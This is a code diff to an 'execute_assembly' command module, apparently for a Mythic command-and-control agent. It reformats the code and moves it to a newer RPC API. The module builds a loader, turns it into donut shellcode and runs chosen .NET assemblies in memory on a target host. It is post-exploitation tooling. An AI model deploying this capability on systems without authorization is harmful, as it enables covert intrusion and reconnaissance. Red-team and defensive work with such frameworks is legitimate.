@@ -14,6 +14,7 @@ import donut
 
 EXEECUTE_ASSEMBLY_PATH = "/srv/ExecuteAssembly.exe"
 
+
 class ExecuteAssemblyArguments(TaskArguments):
 
     def __init__(self, command_line, **kwargs):
@@ -21,8 +22,8 @@ class ExecuteAssemblyArguments(TaskArguments):
         self.args = [
             CommandParameter(
                 name="assembly_name",
-                cli_name = "Assembly",
-                display_name = "Assembly",
+                cli_name="Assembly",
+                display_name="Assembly",
                 type=ParameterType.ChooseOne,
                 dynamic_query_function=self.get_files,
                 description="Assembly to execute (e.g., Seatbelt.exe).",
@@ -39,7 +40,7 @@ class ExecuteAssemblyArguments(TaskArguments):
                 display_name="Arguments",
                 type=ParameterType.String,
                 description="Arguments to pass to the assembly.",
-                parameter_group_info = [
+                parameter_group_info=[
                     ParameterGroupInfo(
                         required=False,
                         group_name="Default",
@@ -48,24 +49,23 @@ class ExecuteAssemblyArguments(TaskArguments):
                 ]),
         ]
 
-
     async def get_files(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
         fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
-        file_resp = await MythicRPC().execute("get_file", callback_id=inputMsg.Callback,
-                                              limit_by_callback=True,
-                                              get_contents=False,
-                                              filename="",
-                                              max_results=-1)
-        if file_resp.status == MythicRPCStatus.Success:
+        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+            CallbackID=inputMsg.Callback,
+            LimitByCallback=True,
+            Filename="",
+        ))
+        if file_resp.Success:
             file_names = []
-            for f in file_resp.response:
-                if f["filename"] not in file_names and f["filename"].endswith(".exe"):
-                    file_names.append(f["filename"])
+            for f in file_resp.Files:
+                if f.Filename not in file_names and f.Filename.endswith(".exe"):
+                    file_names.append(f.Filename)
             fileResponse.Success = True
             fileResponse.Choices = file_names
             return fileResponse
         else:
-            fileResponse.Error = file_resp.error
+            fileResponse.Error = file_resp.Error
             return fileResponse
 
     async def parse_arguments(self):
@@ -95,45 +95,49 @@ class ExecuteAssemblyCommand(CommandBase):
         global EXEECUTE_ASSEMBLY_PATH
         agent_build_path = tempfile.TemporaryDirectory()
         outputPath = "{}/ExecuteAssembly/bin/Release/ExecuteAssembly.exe".format(agent_build_path.name)
-            # shutil to copy payload files over
+        # shutil to copy payload files over
         copy_tree(str(self.agent_code_path), agent_build_path.name)
-        shell_cmd = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release {}/ExecuteAssembly/ExecuteAssembly.csproj".format(agent_build_path.name)
+        shell_cmd = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release {}/ExecuteAssembly/ExecuteAssembly.csproj".format(
+            agent_build_path.name)
         proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
-                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
+                                                     stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
         stdout, stderr = await proc.communicate()
         if not path.exists(outputPath):
             raise Exception("Failed to build ExecuteAssembly.exe:\n{}".format(stderr.decode()))
         shutil.copy(outputPath, EXEECUTE_ASSEMBLY_PATH)
 
-    async def create_tasking(self, task: MythicTask) -> MythicTask:
+    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
+        response = PTTaskCreateTaskingMessageResponse(
+            TaskID=taskData.Task.ID,
+            Success=True,
+        )
         global EXEECUTE_ASSEMBLY_PATH
-        task.args.add_arg("pipe_name", str(uuid4()))
+        taskData.args.add_arg("pipe_name", str(uuid4()))
         if not path.exists(EXEECUTE_ASSEMBLY_PATH):
             # create
             await self.build_exeasm()
-        
-        
-        donutPic = donut.create(file=EXEECUTE_ASSEMBLY_PATH, params=task.args.get_arg("pipe_name"))
-        file_resp = await MythicRPC().execute("create_file",
-                                              task_id=task.id,
-                                              file=base64.b64encode(donutPic).decode(),
-                                              delete_after_fetch=True)
-        if file_resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
+
+        donutPic = donut.create(file=EXEECUTE_ASSEMBLY_PATH, params=taskData.args.get_arg("pipe_name"))
+        file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
+            TaskID=taskData.Task.ID,
+            FileContents=donutPic,
+            DeleteAfterFetch=True
+        ))
+        if file_resp.Success:
+            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
         else:
-            raise Exception("Failed to register execute_assembly binary: " + file_resp.error)
+            raise Exception("Failed to register execute_assembly binary: " + file_resp.Error)
 
-
-        taskargs = task.args.get_arg("assembly_arguments")
+        taskargs = taskData.args.get_arg("assembly_arguments")
         if taskargs == "" or taskargs is None:
-            task.display_params = "-Assembly {}".format(task.args.get_arg("assembly_name"))
+            response.DisplayParams = "-Assembly {}".format(taskData.args.get_arg("assembly_name"))
         else:
-            task.display_params = "-Assembly {} -Arguments {}".format(
-                task.args.get_arg("assembly_name"),
+            response.DisplayParams = "-Assembly {} -Arguments {}".format(
+                taskData.args.get_arg("assembly_name"),
                 taskargs
             )
 
-        return task
+        return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
         resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
